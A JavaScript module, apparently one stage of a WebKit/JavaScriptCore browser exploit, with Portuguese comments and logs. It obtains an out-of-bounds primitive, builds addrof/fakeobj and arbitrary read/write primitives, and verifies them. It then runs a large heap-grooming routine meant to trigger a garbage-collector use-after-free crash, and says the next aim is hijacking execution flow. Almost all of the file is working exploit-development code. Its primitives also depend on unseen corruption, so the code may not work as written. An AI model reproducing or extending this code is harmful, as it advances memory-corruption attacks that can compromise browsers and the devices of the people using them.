// js/script3/testArrayBufferVictimCrash.mjs (v108 - R90 - Crash Isolation)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. Foco Total em Isolar o Crash: As fases de vazamento de ponteiros foram removidas.
// 2. Objetivo: Executar a rotina de Heap Grooming que causa o crash de UAF/GC de forma
//    consistente para estudo.
// 3. Próximo Passo (Após este script): Com o gatilho do crash isolado, o próximo
//    passo será estabilizar a primitiva `addrof` e usá-la para colocar um
//    objeto "vítima" controlado no local do UAF para controlar o fluxo de execução.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    oob_read_absolute
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R90_CrashIsolation";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// Função auxiliar para obter offsets de forma segura
function getSafeOffset(baseObject, path, defaultValue = 0) {
    let current = baseObject;
    const parts = path.split('.');
    let fullPath = '';
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        fullPath += (fullPath ? '.' : '') + part;
        if (current && typeof current === 'object' && part in current) {
            current = current[part];
        } else {
            logS3(`ALERTA: Caminho de offset "${path}" parte "${fullPath}" é undefined. Usando valor padrão ${defaultValue}.`, "warn");
            return defaultValue;
        }
    }
    if (typeof current === 'number') {
        return current;
    }
    if (typeof current === 'string' && String(current).startsWith('0x')) {
        return parseInt(String(current), 16) || defaultValue;
    }
    logS3(`ALERTA: Offset "${path}" não é um número ou string hex. Usando valor padrão ${defaultValue}.`, "warn");
    return defaultValue;
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (FOCO NO CRASH)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Foco em Isolar o Crash de UAF/GC ---`, "test");

    let final_result = {
        success: false,
        message: "A verificação funcional de L/E falhou ou a rotina de crash não foi acionada.",
        webkit_leak_details: { success: false, msg: "Rotina de crash não acionada." }
    };

    const NEW_POLLUTION_VALUE = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);

    try {
        logS3("PAUSA INICIAL: Aguardando carregamento completo do ambiente e offsets.", "info");
        await PAUSE_S3(1000);

        const LOCAL_JSC_OFFSETS = {
            JSObject_BUTTERFLY_OFFSET: getSafeOffset(JSC_OFFSETS, 'JSObject.BUTTERFLY_OFFSET'),
            ArrayBufferView_M_LENGTH_OFFSET: getSafeOffset(JSC_OFFSETS, 'ArrayBufferView.M_LENGTH_OFFSET'),
        };

        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            throw new Error("Falha ao obter primitiva OOB.");
        }
        logS3("OOB DataView obtido com sucesso.", "info");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        const test_obj_for_rw_verification = { spray_A: 0xDEADBEEF, spray_B: 0xCAFEBABE };
        const test_obj_for_rw_verification_addr = addrof(test_obj_for_rw_verification);
        const prop_spray_A_addr = test_obj_for_rw_verification_addr.add(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET);
        
        arb_write_final(prop_spray_A_addr, NEW_POLLUTION_VALUE);
        const value_read_for_verification = arb_read_final(prop_spray_A_addr);

        if (value_read_for_verification.equals(NEW_POLLUTION_VALUE)) {
            logS3("+++++++++++ SUCESSO L/E! A primitiva de Leitura/Escrita é 100% funcional. Prosseguindo para o gatilho do crash. ++++++++++++", "vuln");
            final_result.success = true; // Success up to this point
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${NEW_POLLUTION_VALUE.toString(true)}, Lido: ${value_read_for_verification.toString(true)}`);
        }

        // --- FASE 5: Isolando o Crash do GC (Use-After-Free) ---
        logS3("--- FASE 5: Foco em acionar o crash de GC (UAF) com um Heap Grooming isolado ---", "subtest");
        
        try {
            logS3("  Iniciando a rotina de Heap Grooming que causa o crash...", "info");
            let aggressive_feng_shui_objects = [];
            let filler_objects = [];
            const NUM_GROOMING_OBJECTS = 75000;
            const NUM_FILLER_OBJECTS = 15000;

            logS3(`  [ETAPA 1/5] Alocando ${NUM_GROOMING_OBJECTS} objetos para fragmentar a memória...`, "debug");
            for (let i = 0; i < NUM_GROOMING_OBJECTS; i++) {
                aggressive_feng_shui_objects.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64));
                if (i % 1000 === 0) aggressive_feng_shui_objects.push({});
            }

            logS3("  [ETAPA 2/5] Criando buracos no heap (liberando metade dos objetos)...", "debug");
            for (let i = 0; i < aggressive_feng_shui_objects.length; i += 2) {
                aggressive_feng_shui_objects[i] = null;
            }

            logS3(`  [ETAPA 3/5] Preenchendo os buracos com ${NUM_FILLER_OBJECTS} objetos...`, "debug");
            for (let i = 0; i < NUM_FILLER_OBJECTS; i++) {
                filler_objects.push(new Uint32Array(Math.floor(Math.random() * 64) + 16));
            }

            logS3("  [ETAPA 4/5] Liberando referências para os arrays de grooming...", "debug");
            aggressive_feng_shui_objects.length = 0;
            aggressive_feng_shui_objects = null;
            // A referência a 'filler_objects' é mantida para segurar a memória preenchida.

            logS3("  [ETAPA 5/5] Pausando por 10 segundos para forçar a execução do Garbage Collector (GC). O CRASH DEVE OCORRER AQUI.", "critical");
            await PAUSE_S3(10000);

            // Se o código chegar aqui, o crash não ocorreu.
            logS3("  ROTINA DE GROOMING CONCLUÍDA SEM CRASH.", "good");
            final_result.message = "A rotina de grooming foi concluída sem causar um crash. A condição de UAF pode ser não-determinística ou depender de um gatilho adicional.";
            final_result.webkit_leak_details = {
                success: false, 
                msg: final_result.message
            };
            
        } catch (grooming_crash_e) {
            // Este catch provavelmente não será alcançado se o processo do navegador morrer,
            // mas é mantido por segurança.
            throw new Error(`Erro durante a rotina de grooming: ${grooming_crash_e.message}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
        final_result.webkit_leak_details.success = false;
        final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    if (!final_result.success) {
        logS3("O teste terminou. Se o navegador não travou, a condição de UAF não foi acionada nesta execução. Tente novamente.", "warn");
    }

    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: final_result.webkit_leak_details,
        heisenbug_on_M2_in_best_result: false, // O objetivo agora é o crash, não o heisenbug.
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged UAF/GC Crash Isolation' }
    };
}
